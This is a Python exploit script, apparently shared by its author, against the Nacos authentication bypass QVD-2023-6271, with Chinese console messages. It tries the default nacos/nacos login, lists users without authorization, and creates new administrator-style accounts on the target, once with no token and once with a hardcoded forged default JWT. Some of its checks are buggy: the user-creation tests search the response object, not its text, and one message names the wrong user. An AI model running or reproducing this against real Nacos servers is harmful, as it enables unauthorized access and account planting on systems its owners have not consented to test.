import argparse
import requests
import urllib3
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
def title():
    print("* " * 20)
    print("[+]漏洞名称：Nacos身份认证绕过漏洞")
    print("[+]漏洞编号：QVD-2023-6271")
    print("[+]Author：维维豆奶-dave")
    print("* " * 20)

def help():
    print('  python nacosexp.py -u URL')
    print('  -u, --url <url>       the url to retrieve data from')
    exit()

def poc1(url):
    print("\n\n\n正在检测是否存在nacos默认口令")
    if url.endswith("/"):
        path = "nacos/v1/auth/users/login"
    else:
        path = "/nacos/v1/auth/users/login"
    data = {
        "username": "nacos",
        "password": "nacos"
    }
    checkpoc1 = requests.post(url=url+path,headers=head,data=data,verify=False)
    if checkpoc1.status_code == 200:
        print(Fore.GREEN + "[+]存在默认口令nacos")
    else:
        print(Fore.RED + "[-]不存在默认口令")

def poc2(url):
    print("正在检测是否存在未授权查看用户列表漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
    else:
        path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
    checkpoc2 = requests.get(url=url+path,headers=head,verify=False)
    if "username" in checkpoc2.text:
        print(Fore.GREEN + f"[+]存在未授权访问漏洞,你可访问 {url+path} 查看详细信息")
    else:
        print(Fore.RED + "[-]不存在未授权访问漏洞")

def poc3(url):
    print("正在检测是否存在任意用户添加漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users"
    else:
        path = "/nacos/v1/auth/users"
    data = {
        "username": "abc123",
        "password": "test123"
    }
    checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc3:
        print(Fore.GREEN + "[+]用户:abc123 添加成功，密码为：test123")
    else:
        print(Fore.RED + "[-]不存在任意用户添加漏洞")

def poc4(url):
    print("正在检测是否存在默认JWT任意用户添加漏洞")
    if url.endswith("/"):
        path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    else:
        path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    data = {
        "username": "test2",
        "password": "test123"
    }
    checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc3:
        print(Fore.GREEN + "[+]用户:test1 添加成功，密码为：test123")
    else:
        print(Fore.RED + "[-]不存在默认JWT任意用户添加漏洞")

if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', '--showhelp', action='help', help='显示帮助')
    parser.add_argument("-u", "--url", help="漏洞url地址")
    parser.set_defaults(show_help=False)
    args = parser.parse_args()
    if not args.show_help and not args.url:
        print("请输入 -u 参数指定 URL 地址：python3 nacosexp.py -u url")
        parser.print_help()
        exit()
    poc1(args.url)
    poc2(args.url)
    poc3(args.url)
    poc4(args.url)
